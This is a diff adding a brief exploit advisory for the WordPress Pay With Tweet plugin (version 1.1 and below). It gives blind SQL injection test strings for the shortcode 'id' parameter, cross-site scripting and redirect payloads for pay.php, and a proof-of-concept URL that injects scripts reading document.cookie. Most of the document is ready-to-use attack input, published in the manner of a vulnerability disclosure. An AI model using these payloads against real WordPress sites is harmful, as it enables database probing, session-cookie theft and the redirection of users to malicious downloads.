@@ -1,0 +1,25 @@
+# Exploit Title: Wordpress Pay With Tweet plugin <= 1.1 Multiple Vulnerabilities
+# Date: 01/06/2012
+# Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
+# Software Link: http://downloads.wordpress.org/plugin/pay-with-tweet.1.1.zip
+# Version: 1.1
+
+1)  Blind SQL Injection in shortcode:
+    Short code parameter 'id' is prone to blind sqli, 
+    you need to be able to write a post/page to exploit this:
+
+    [paywithtweet id="1' AND 1=2"]
+    [paywithtweet id="1' AND 1=1"]
+
+2)  Multiple XSS in pay.php
+    http://target.com/wp-content/plugins/pay-with-tweet.php/pay.php    
+    
+    After connecting to twitter:
+        ?link=&22></input>[XSS]
+    After submitting the tweet:
+        ?title=[XSS]&dl=[REDIRECT-TO-URL]%27)">[XSS]
+
+    The final download link will be replaced with [REDIRECT-TO-URL]
+
+    POC: pay.php?link=%22></input><script>alert(document.cookie)</script>&title=<script>alert(document.cookie)</script>&dl=http://brindi.si%27"><script>alert(document.cookie)</script>
+                        
